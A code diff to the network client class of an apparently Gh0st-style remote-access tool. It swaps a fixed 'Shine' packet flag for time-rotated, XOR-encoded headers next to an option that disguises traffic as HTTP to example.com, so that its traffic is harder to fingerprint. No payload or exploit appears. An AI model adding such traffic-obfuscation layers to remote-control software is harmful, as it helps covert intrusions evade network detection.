@@ -96,12 +96,14 @@ VOID IOCPClient::setManagerCallBack(void* Manager,  DataProcessCB dataProcess)
 }
 
 
-IOCPClient::IOCPClient(State&bExit, bool exit_while_disconnect, int mask) : g_bExit(bExit)
+IOCPClient::IOCPClient(State&bExit, bool exit_while_disconnect, int mask, int encoder) : g_bExit(bExit)
 {
 	m_ServerAddr = {};
 	m_nHostPort = 0;
 	m_Manager = NULL;
 	m_masker = mask ? new HttpMask("example.com") : new PkgMask();
+	auto enc = GetHeaderEncoder(HeaderEncType(time(nullptr) % HeaderEncNum));
+	m_Encoder = encoder ? new HellEncoder(enc, new XOREncoder16()) : new ProtocolEncoder();
 #ifdef _WIN32
 	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -110,9 +112,6 @@ IOCPClient::IOCPClient(State&bExit, bool exit_while_disconnect, int mask) : g_bE
 	m_sClientSocket = INVALID_SOCKET;
 	m_hWorkThread   = NULL;
 	m_bWorkThread = S_STOP;
-
-	memset(m_szPacketFlag, 0, sizeof(m_szPacketFlag));
-	memcpy(m_szPacketFlag,"Shine",FLAG_LENGTH);
 
 	m_bIsRunning = TRUE;
 	m_bConnected = FALSE;
@@ -149,6 +148,7 @@ IOCPClient::~IOCPClient()
 	ZSTD_freeDCtx(m_Dctx);
 #endif
 	m_masker->Destroy();
+	SAFE_DELETE(m_Encoder);
 }
 
 // 从域名获取IP地址
@@ -361,6 +361,8 @@ VOID IOCPClient::OnServerReceiving(char* szBuffer, ULONG ulLength)
 		assert (ulLength > 0);	
 		//以下接到数据进行解压缩
 		m_CompressedBuffer.WriteBuffer((LPBYTE)szBuffer, ulLength);
+		int FLAG_LENGTH = m_Encoder->GetFlagLen();
+		int HDR_LENGTH = m_Encoder->GetHeadLen();
 
 		//检测数据是否大于数据头大小 如果不是那就不是正确的数据
 		while (m_CompressedBuffer.GetBufferLength() > HDR_LENGTH)
@@ -373,12 +375,13 @@ VOID IOCPClient::OnServerReceiving(char* szBuffer, ULONG ulLength)
 			if (m_CompressedBuffer.GetBufferLength() <= HDR_LENGTH)
 				break;
 
-			char szPacketFlag[FLAG_LENGTH + 3] = {0};
+			char szPacketFlag[32] = {0};
 			src = (char*)m_CompressedBuffer.GetBuffer();
 			CopyMemory(szPacketFlag, src, FLAG_LENGTH);
 			//判断数据头
-			if (memcmp(m_szPacketFlag, szPacketFlag, FLAG_LENGTH) != 0)
-			{
+			HeaderEncType encType = HeaderEncUnknown;
+			FlagType flagType = CheckHead(szPacketFlag, encType);
+			if (flagType == FLAG_UNKNOWN) {
 				Mprintf("[ERROR] OnServerReceiving memcmp fail: unknown header '%s'\n", szPacketFlag);
 				m_CompressedBuffer.ClearBuffer();
 				break;
@@ -404,7 +407,7 @@ VOID IOCPClient::OnServerReceiving(char* szBuffer, ULONG ulLength)
 				PBYTE DeCompressedBuffer = ulCompressedLength > bufSize ? new BYTE[ulOriginalLength] : buf2;
 
 				m_CompressedBuffer.ReadBuffer(CompressedBuffer, ulCompressedLength);
-
+				m_Encoder->Decode(CompressedBuffer, ulCompressedLength, (LPBYTE)szPacketFlag);
 				size_t	iRet = uncompress(DeCompressedBuffer, &ulOriginalLength, CompressedBuffer, ulCompressedLength);
 
 				if (Z_SUCCESS(iRet))//如果解压成功
@@ -468,10 +471,11 @@ BOOL IOCPClient::OnServerSending(const char* szBuffer, ULONG ulOriginalLength)  
 #if !USING_ZLIB
 		ulCompressedLength = iRet;
 #endif
-		ULONG ulPackTotalLength = ulCompressedLength + HDR_LENGTH;
+		ULONG ulPackTotalLength = ulCompressedLength + m_Encoder->GetHeadLen();
 		CBuffer m_WriteBuffer;
-
-		m_WriteBuffer.WriteBuffer((PBYTE)m_szPacketFlag, FLAG_LENGTH);
+		HeaderFlag H = m_Encoder->GetHead();
+		m_Encoder->Encode(CompressedBuffer, ulCompressedLength, (LPBYTE)H.data());
+		m_WriteBuffer.WriteBuffer((PBYTE)H.data(), m_Encoder->GetFlagLen());
 
 		m_WriteBuffer.WriteBuffer((PBYTE) &ulPackTotalLength,sizeof(ULONG));
 
